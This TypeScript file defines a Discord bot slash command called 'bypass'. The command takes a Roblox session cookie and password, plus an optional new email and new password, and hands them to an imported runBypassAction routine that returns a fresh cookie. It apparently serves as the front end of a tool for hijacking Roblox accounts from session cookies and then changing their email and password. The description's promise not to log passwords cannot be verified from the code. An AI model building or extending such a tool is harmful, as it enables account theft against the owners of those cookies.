import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
  MessageFlags,
} from 'discord.js';
import { runBypassAction } from '../../lib/actions';
import { buildErrorEmbed } from '../../lib/embed-helpers';
import { buildCopyButtons, handleCopyButtonClick } from '../../lib/button-helpers';
import { logger } from '../../lib/logger';
import type { Command } from './types';

const data = new SlashCommandBuilder()
  .setName('bypass')
  .setDescription('Bypass Stuff')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addStringOption((opt) =>
    opt.setName('cookie').setDescription('Insert The Cookies!').setRequired(true)
  )
  .addStringOption((opt) =>
    opt.setName('password')
      .setDescription('Your Roblox password (we do NOT log or store this)')
      .setRequired(true)
  )
  .addStringOption((opt) =>
    opt.setName('new_email')
      .setDescription('Optional: new email to set if no email found')
      .setRequired(false)
  )
  .addStringOption((opt) =>
    opt.setName('new_password')
      .setDescription('Optional: new password to change after bypass')
      .setRequired(false)
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const rawCookie = interaction.options.getString('cookie', true);
    const password = interaction.options.getString('password', true);
    const newEmail = interaction.options.getString('new_email') || undefined;
    const newPassword = interaction.options.getString('new_password') || undefined;

    const result = await runBypassAction(rawCookie, password, newEmail, newPassword);
    if (result.success && result.newCookie) {
      const id = Math.random().toString(36).slice(2, 10);
      const row = buildCopyButtons(id, 'bypass', result.newCookie, false);
      await interaction.editReply({ embeds: [result.embed], components: [row] });
    } else {
      await interaction.editReply({ embeds: [result.embed] });
    }
  } catch (err: any) {
    logger.error({ err }, 'Bypass command error');
    await interaction.editReply({
      embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')],
    });
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  if (await handleCopyButtonClick(interaction)) return;
}

export const bypassCommand: Command = { data, execute, handleButton };